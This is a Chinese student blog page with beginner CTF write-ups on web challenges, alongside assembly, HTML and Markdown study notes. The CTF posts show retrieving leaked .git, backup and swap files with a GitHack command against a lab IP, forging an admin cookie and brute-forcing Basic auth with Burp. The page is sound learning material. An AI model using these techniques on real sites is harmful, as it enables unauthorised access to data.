<h1 id="（2）用Debug跟踪tl-exe的执行过程，记录每一步执行后，相关寄存器中的内容和栈顶内容"><a href="#（2）用Debug跟踪tl-exe的执行过程，记录每一步执行后，相关寄存器中的内容和栈顶内容" class="headerlink" title="（2）用Debug跟踪tl.exe的执行过程，记录每一步执行后，相关寄存器中的内容和栈顶内容"></a>（2）用Debug跟踪tl.exe的执行过程，记录每一步执行后，相关寄存器中的内容和栈顶内容</h1><p><strong>执行前两部步，ax赋值2000H，并把值赋予ss。初始化sp，并赋值</strong><br><img src="https://img-blog.csdnimg.cn/6bb0b49e8ca84a9f83cdce88a56ce667.png#pic_center" alt="在这里插入图片描述"></p>
<p><strong>执行pop ax，pop bx。每执行一次sp都+2</strong><br><img src="https://img-blog.csdnimg.cn/b6523eacd5ea428b858488d0eafb65c4.png#pic_center" alt="在这里插入图片描述"><br><strong>执行push ax,push bx。每执行一次sp都-2</strong><br><img src="https://img-blog.csdnimg.cn/4ae3e97541654459a31684b79255ada2.png#pic_center" alt="在这里插入图片描述"><br><strong>继续执行，直到安全退出</strong><br><img src="https://img-blog.csdnimg.cn/65b98ff706364acfbc4ff69dabc92192.png#pic_center" alt="在这里插入图片描述"><br>&#x3D;&#x3D;由上图可知栈顶一直为0&#x3D;&#x3D;</p>
<h1 id="（3）查看PSP的内容"><a href="#（3）查看PSP的内容" class="headerlink" title="（3）查看PSP的内容"></a>（3）查看PSP的内容</h1><p><strong>由上图知DS和CS之间差10H，即256个字节，这段内存就是psp区，进去看看。</strong><br><img src="https://img-blog.csdnimg.cn/96cf834c7870452994019052159e868b.png#pic_center" alt="在这里插入图片描述"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-CTF-学习日记（2）"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/29/CTF-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%882%EF%BC%89/"
    >CTF 学习日记（2）</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/29/CTF-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%882%EF%BC%89/" class="article-date">
  <time datetime="2023-07-29T09:16:59.000Z" itemprop="datePublished">2023-07-29</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="CTF学习日记"><a href="#CTF学习日记" class="headerlink" title="CTF学习日记"></a>CTF学习日记</h1><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><hr>
<blockquote>
<p><font size=6>目录遍历</font></p>
</blockquote>
<p>1.进入环境，根据提示寻找flag<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xTFjiT"><img src="https://img-blog.csdnimg.cn/img_convert/bcfc24b5bf497fcf692020687d600d40.jpeg" alt="xTFjiT.jpg"></a>  </p>
<p>2.一个一个包寻找，最终在包4&#x2F;4找到flag<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xTkCLR"><img src="https://img-blog.csdnimg.cn/img_convert/247876777ddaba377c45611c93d37296.jpeg" alt="xTkCLR.jpg"></a>  </p>
<blockquote>
<p><font size=6>PHPINFO</font>  </p>
</blockquote>
<p>1.进入环境，没有任何可以操作的地方，再看看源代码  </p>
<p>2.在源代码中进行关键词搜索，搜索<code>flag</code>，得到答案<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xTk1TP"><img src="https://img-blog.csdnimg.cn/img_convert/55049e457d954dbc23f90098c6abf411.jpeg" alt="xTk1TP.jpg"></a>  </p>
<blockquote>
<p><font size=6>备份文件下载</font>  </p>
</blockquote>
<h3 id="网站源码"><a href="#网站源码" class="headerlink" title="- 网站源码"></a>- 网站源码</h3><p>1.根据提示，进行源文件搜索，最终在<a target="_blank" rel="noopener" href="http://www.zip找到东西,解压得到如下/">www.zip找到东西，解压得到如下</a><br><a target="_blank" rel="noopener" href="https://imgse.com/i/xTe1G6"><img src="https://img-blog.csdnimg.cn/img_convert/ad0011dfb2aa6e1b70e6eee14875c064.jpeg" alt="xTe1G6.jpg"></a>  </p>
<p>2.打开之后发现被耍了😅<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xTe3RK"><img src="https://img-blog.csdnimg.cn/img_convert/147e60928fe68c674d53ad30bb0804ef.jpeg" alt="xTe3RK.jpg"></a>   </p>
<p>3.直接在网站上访问txt文件，得到flag<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xTe0it"><img src="https://img-blog.csdnimg.cn/img_convert/68d07c2d7b484368061e71e4e0ae33dc.jpeg" alt="xTe0it.jpg"></a>  </p>
<h3 id="bak文件"><a href="#bak文件" class="headerlink" title="- bak文件"></a>- bak文件</h3><p>1.直接根据提示访问index.php.bak文件<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xTe2Zj"><img src="https://img-blog.csdnimg.cn/img_convert/fba953785f832143425e0e910f752c13.jpeg" alt="xTe2Zj.jpg"></a>  </p>
<p>2.得到flag<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xTe7yF"><img src="https://img-blog.csdnimg.cn/img_convert/bd17ed57fde5600d56ceeea4c42b5035.jpeg" alt="xTe7yF.jpg"></a>  </p>
<h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="- vim缓存"></a>- vim缓存</h3><p>1.简单百度了一下vim缓存文件的后缀为.swp，直接访问<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xTmNlT"><img src="https://img-blog.csdnimg.cn/img_convert/a6b7d6ef7ead2872495c2394f9bfbe63.jpeg" alt="xTmNlT.jpg"></a>  </p>
<p>2.结果还是Not found  </p>
<p>3.再次百度得知缓存文件为隐藏文件，故要在前面再加一个<code>.</code>，再次访问，得到flag<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xTmyfx"><img src="https://img-blog.csdnimg.cn/img_convert/25865ffd87122b8b516b13ec7ddd704f.jpeg" alt="xTmyfx.jpg"></a>  </p>
<h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title="- DS_Store"></a>- DS_Store</h3><p>1.进入环境，不知道该怎么操作，但是查询文件的题目做了好多，按照类似的思路先访问一下DS_Store<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xTnrDg"><img src="https://img-blog.csdnimg.cn/img_convert/39ab7c2ba8e6ce2a7e8a7e5c7a3d68a1.jpeg" alt="xTnrDg.jpg"></a><br>发现还是404 Not found   </p>
<p>2.百度了一下发现DS_Store也是隐藏文件，直接在前面加<code>. </code> ，再访问，得到一个文件<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xTnRCq"><img src="https://img-blog.csdnimg.cn/img_convert/6dced19c7851a2b1432c7d5850bb5f02.jpeg" alt="xTnRCq.jpg"></a> </p>
<p>3.访问文件中的地址，得到flag   </p>
<blockquote>
<p><font size=6>Git泄露</font>  </p>
</blockquote>
<h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><ol>
<li>下载Githack以及2.7版本的python并配置环境（一定要python2）</li>
</ol>
<p>2.打开cmd，进入Githack-master目录下，输入<br><code>python githack.py http://111.200.241.244:62693（目标网址）/.git/，  </code><br>得到如下<br><a target="_blank" rel="noopener" href="https://imgse.com/i/x7ANJf"><img src="https://img-blog.csdnimg.cn/img_convert/d8aaa19df482d376736e5e3cb33a6177.jpeg" alt="x7ANJf.jpg"></a>  </p>
<p>3.打开cmd中提供的文件，右键Git bash here！并输入git log（查看历史提交）得到如下<br><a target="_blank" rel="noopener" href="https://imgse.com/i/x7EQhV"><img src="https://img-blog.csdnimg.cn/img_convert/c9e0127be37e067ee5b075308da68a69.jpeg" alt="x7EQhV.jpg"></a>  </p>
<p>4.回滚到上个版本，输入<br><code> git diff 77c391b0f2980556cf8aeceecdf093634718a070</code><br>得到flag  </p>
<h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><p>1.执行上一题的前三步  </p>
<p>2.先执行git stash list：查看stash了那些存储  </p>
<p>3.执行git stash pop  </p>
<blockquote>
<p>这一步的目的是恢复之前缓存的目录，将缓存堆栈中的对应stash删除，并将对应修改应用到当前的工作目录下。  </p>
</blockquote>
<p>4.打开文件夹点击生产的.txt文件，得到flag  </p>
<h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><p>1.执行上一题的前三步  </p>
<p>2.直接在文件夹内生产.txt文件，获得flag  </p>
<hr>
<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><ul>
<li><font size=6>目录遍历</font><br>1.什么是目录遍历</li>
</ul>
<p>目录遍历是由于网站存在缺陷，导致网站目录可以被任意浏览，这会导致网站很多隐私文件与目录泄露<br>比如数据库备份文件，配置文件等目录遍历这个漏洞需要经常的去摸一摸，探一探存在资源的地方就极有可能存在目录遍历.</p>
<p>2.目录遍历攻击是如何实现的  </p>
<p>（1）测试检索文件和检索参数</p>
<p>攻击者尝试发送这样一个url，成功返回了oldarchive.html后，攻击者就知道show.asp文件是可以通过web服务器的文件系统进行查询找到view参数后面的文件的。【需要攻击者不断测试网站拥有的请求和响应，找到正确的查询文件脚本和查询参数】  </p>
<p>（2）恶意参数注入 </p>
<p>攻击者通过不断测试去修改参数，以不断往上翻高层目录可以找到windows所在的位置，进行恶意攻击  </p>
<p>3.如何防御目录遍历攻击 </p>
<ul>
<li><p>确保web服务器软件版本最新，并且已经安装所有补丁</p>
</li>
<li><p>有效过滤任何用户输入，防范参数中的转义字符，通过utf8编码后只要发现参数包含可能引发目录遍历攻击的非法字符，直接拒绝请求，如果合法再将用户输入提交到服务器。</p>
</li>
<li><p>确保权限控制到位，谨慎处理传向文件系统API的参数【与第二点差不多】</p>
</li>
<li><p>对文件类型进行白名单控制【只允许请求html文件、css文件、js文件等这些】，对包含恶意字符或者空字符的参数进行拒绝。【windows现在已知的文件名非法字符有 \ &#x2F; : * ? “ &lt; &gt; | 】【 linux文件名非法字符 “&#x2F; “ 】</p>
</li>
<li><p>当然，如有需要，使用全面的web漏洞扫描，把网站安全可能涉及的各种漏洞都进行检查。</p>
</li>
</ul>
<hr>
<h1 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h1><ul>
<li>掌握了两门git漏洞挖掘工具  </li>
<li>学习到了一些git漏洞挖掘的思路  </li>
<li>了解了前端方面的知识</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-CTF-学习日记（1）"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/29/CTF-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%881%EF%BC%89/"
    >CTF 学习日记第一次总结</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/29/CTF-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%881%EF%BC%89/" class="article-date">
  <time datetime="2023-07-29T09:16:51.000Z" itemprop="datePublished">2023-07-29</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="CTF学习日记"><a href="#CTF学习日记" class="headerlink" title="CTF学习日记"></a>CTF学习日记</h1><h2 id="web前置技能-HTTP协议"><a href="#web前置技能-HTTP协议" class="headerlink" title="web前置技能-HTTP协议"></a>web前置技能-HTTP协议</h2><hr>
<blockquote>
<p><font size=6>请求方式</font>  </p>
</blockquote>
<p>1.打开环境根据提示，利用BURP抓包，改传参方式为<code>CTFUHB</code><br><a target="_blank" rel="noopener" href="https://imgse.com/i/xoSslq"><img src="https://img-blog.csdnimg.cn/img_convert/0ccbf227d65bd4a0c38714fc99244760.jpeg" alt="xoSslq.jpg"></a><br><a target="_blank" rel="noopener" href="https://imgse.com/i/xoS7X6"><img src="https://img-blog.csdnimg.cn/img_convert/b91baca405f8b4552530250fd1c5e63a.jpeg" alt="xoS7X6.jpg"></a>  </p>
<p>2.得到flag<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xoSq0O"><img src="https://img-blog.csdnimg.cn/img_convert/821e578798cb6e2e347648c19f468973.jpeg" alt="xoSq0O.jpg"></a>  </p>
<blockquote>
<p><font size=6>302跳转</font>  </p>
</blockquote>
<p>1.点击超链接，发现没有反应，检查NETWORK，发现有状态码为302<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xopncq"><img src="https://img-blog.csdnimg.cn/img_convert/159ee5b0589fc20e00ed8842fc3b35d6.jpeg" alt="xopncq.jpg"></a>  </p>
<p>2.直接抓包，点击Give me flag，将得到的包邮件发送到repeater，点击发送，在响应包中得到flag<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xop0HO"><img src="https://img-blog.csdnimg.cn/img_convert/d2cfc5a575f43c36606f0c27ec41757a.jpeg" alt="xop0HO.jpg"></a>  </p>
<blockquote>
<p><font size=6>Cookie</font></p>
</blockquote>
<p>1.根据提示，只有admin才可的到flag<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xops4H"><img src="https://img-blog.csdnimg.cn/img_convert/01d5b509b6b20fdc337296eea74bef88.jpeg" alt="xops4H.jpg"></a>  </p>
<p>2.直接抓包，修改Cookie中的，admin&#x3D;1<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xopggI"><img src="https://img-blog.csdnimg.cn/img_convert/20f43e5746a32834738a8999ada7263c.jpeg" alt="xopggI.jpg"></a>  </p>
<p>3.再放包，得到flag  </p>
<blockquote>
<p><font size=6>基础认证</font></p>
</blockquote>
<p>1.题目给出100组数组  </p>
<p>2.进入环境，敲击页面中的click，可知这次要进行爆破<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xopH8s"><img src="https://img-blog.csdnimg.cn/img_convert/bcc9a33b201c65b0ba6595562eeceec5.jpeg" alt="xopH8s.jpg"></a>  </p>
<p>3.开始抓包！在包中发现关键字Authorization basic(基础认证)<br>后面跟着一段base加密的东西，解码看看<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xopxVU"><img src="https://img-blog.csdnimg.cn/img_convert/0b164682f6c6e03ea67e4488c5325118.jpeg" alt="xopxVU.jpg"></a><br><a target="_blank" rel="noopener" href="https://imgse.com/i/xo9Ar6"><img src="https://img-blog.csdnimg.cn/img_convert/23ff538410eeb452802b71ae8121bd6f.jpeg" alt="xo9Ar6.jpg"></a>  </p>
<p>4.可知账号密码的格式应为（账号：密码）</p>
<p>5.将包发送到Intruder，添加地址<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xo93sP"><img src="https://img-blog.csdnimg.cn/img_convert/e1062792c6f00c02666732362e05641b.jpeg" alt="xo93sP.jpg"></a>  </p>
<p>6.导入字典，启用一个base64编码在payload processing，关闭URL-encode these characters，开始爆破！！！！！！！！  </p>
<p>7.发现一个正确结果也没有😅  </p>
<p>8.查询资料发现base编码里不能有&#x3D;，删除&#x3D;试试  </p>
<p>9.发现有状态码为200，看看响应包，得到flag  </p>
<blockquote>
<p><font size=6>响应包源代码</font>  </p>
</blockquote>
<p>1.BURP抓不到任何包，看看源代码试试  </p>
<p>2.果然有惊喜<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xoCBfH"><img src="https://img-blog.csdnimg.cn/img_convert/9e09626bb2457b4bed1622085676e2fa.jpeg" alt="xoCBfH.jpg"></a>  </p>
<hr>
<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><p><font size=6>302临时重定向</font><br>什么是重定向？<br>即用户输入网站A但打开之后变成了网站B  </p>
<p>作用：<br>301 重定向:搜索引擎在抓取新内容的同时也将旧的网址交换为重定向之后的网址     新网站的内容 —&gt;新网站<br>302重定向:搜索引擎会抓取新的内容而保存旧的网址。 新网站的内容 –&gt;旧网站</p>
<p>所以301重定向被称为永久重定向<br>而302重定向被称为临时重定向  </p>
<hr>
<p>心得  </p>
<ul>
<li>基本掌握BURP的一些用法  </li>
<li>初步了解web方面的攻击方法以及思路</li>
</ul>
<p>而302重定向被称为临时重定向  </p>
<hr>
<p>心得  </p>
<ul>
<li>基本掌握BURP的一些用法  </li>
<li>初步了解web方面的攻击方法以及思路</li>
<li>强化Markdown的使用</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-第一次总结"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/29/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%80%BB%E7%BB%93/"
    >第一次总结</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/29/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2023-07-29T09:13:15.000Z" itemprop="datePublished">2023-07-29</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="利用到的HTML方面知识"><a href="#利用到的HTML方面知识" class="headerlink" title="利用到的HTML方面知识"></a>利用到的HTML方面知识</h1><blockquote>
<p>HTML基本结构</p>
</blockquote>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;title&gt;这是标题&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  这是我的身体。
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<blockquote>
<p>定义一个边框像素为1的边框</p>
</blockquote>
<pre><code>`&lt;table border=&quot;1&quot;&gt;`
</code></pre>
<blockquote>
<p>input标签</p>
</blockquote>
<pre><code>`input type=&quot;value&quot;`
</code></pre>
<p>1.<code>input type=&quot;text&quot;</code><br>可定义一个用户可向其中输入文本的单行的文本字段  </p>
<p>2.<code>input type=&quot;submit&quot;</code><br>定义提交按钮</p>
<hr>
<h1 id="利用phpstudy输出学号姓名"><a href="#利用phpstudy输出学号姓名" class="headerlink" title="利用phpstudy输出学号姓名"></a>利用phpstudy输出学号姓名</h1><p>1.在记事本中写好如下代码并改写后缀为.php<br>    &#96;</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
&lt;meta charset=&quot;UTF-8&quot;&gt;
&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
&lt;title&gt;第一周任务&lt;/title&gt;
&lt;/head&gt;
&lt;body bgcolor=&quot;pink&quot;&gt;
&lt;table border=&quot;1&quot; &gt;
&lt;p&gt;First name:&lt;input id=“2113042810” type=&quot;text&quot; placeholder=&quot;张乐天&quot;&gt;&lt;/p&gt;
  Last name:&lt;input type=&quot;text&quot; placeholder=&quot;2113042810&quot;&gt;
  &lt;p&gt;&lt;input type=&quot;submit&quot;&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>2.在phpstudy创建站点<br><a target="_blank" rel="noopener" href="https://imgse.com/i/x4DbUP"><img src="https://img-blog.csdnimg.cn/img_convert/50ea160f1e3f66f1cd3751b106984179.jpeg" alt="x4DbUP.jpg"></a></p>
<p>3.在根目录中插入.php文件 并在浏览器地址栏输入127.0.0.1&#x2F;zlt.php.<br><a target="_blank" rel="noopener" href="https://imgse.com/i/x4rVv4"><img src="https://img-blog.csdnimg.cn/img_convert/9ec67981478aaffa789ac9209ef6bf7d.jpeg" alt="x4rVv4.jpg"></a></p>
<hr>
<h1 id="MARKDOWN知识总结"><a href="#MARKDOWN知识总结" class="headerlink" title="MARKDOWN知识总结"></a>MARKDOWN知识总结</h1><p>1.标题语法</p>
<p>创建标题，在单词或短语前添加（#）。（#）的数量代表标题的级别。</p>
<p>2.段落语法</p>
<p>创建段落，使用空白行或多行文本进行分割。</p>
<p>3.换行语法</p>
<p>在一行的末尾添加两个或多个空格，然后按回车，即可创建一个换行。</p>
<p>4.强调语法</p>
<p><strong>加粗</strong>：在单词或短语前后各添加两个（<code>*</code>）或（<code>_</code>）<br><em>斜体</em>：在单词或短语前后添加一个（<code>*</code>）或（<code>_</code>）<br>若要同事实现上述两种方法，在单词或短语前后各添加三个（<code>*</code>）或（<code>_</code>）即可<br>&#x3D;&#x3D;高亮&#x3D;&#x3D;：&#x3D;&#x3D;在单词或短语前后各加两个（<code>=</code>）即可&#x3D;&#x3D;<br>5.引用   </p>
<blockquote>
<p>在段落前添加一个（&gt;）即可  </p>
<blockquote>
<p>引用可以嵌套，在需要嵌套的段落前再添加（&gt;）即可</p>
</blockquote>
</blockquote>
<p>6.代码语法<br><code>若要将单词或短语表示为代码,将其包裹在（`）即可</code><br><code>若将要表示的代码中含有(`)可将上述代码包裹在（</code>）即可&#96;&#96;</p>
<p>7.分割线<br>在一行上使用三个或多个（<code>***</code>）、(<code>---</code>)或(<code>___</code>)即可</p>
<p>8.插入图片<br>使用图片语法代码<code>[![图片描述](图片链接)]</code>即可</p>
<hr>
<p>行上使用三个或多个（<code>***</code>）、(<code>---</code>)或(<code>___</code>)即可</p>
<p>8.插入图片<br>使用图片语法代码<code>[![图片描述](图片链接)]</code>即可</p>
<hr>
<p>以上就是我第一次学习的初步总结</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-hello-world"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/28/hello-world/"
    >Hello World</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/28/hello-world/" class="article-date">
  <time datetime="2023-07-28T10:22:01.035Z" itemprop="datePublished">2023-07-28</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
   
  
</article>

    
  </article>
  

  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2023
        <i class="ri-heart-fill heart_icon"></i> 玄野計
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="=3="></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
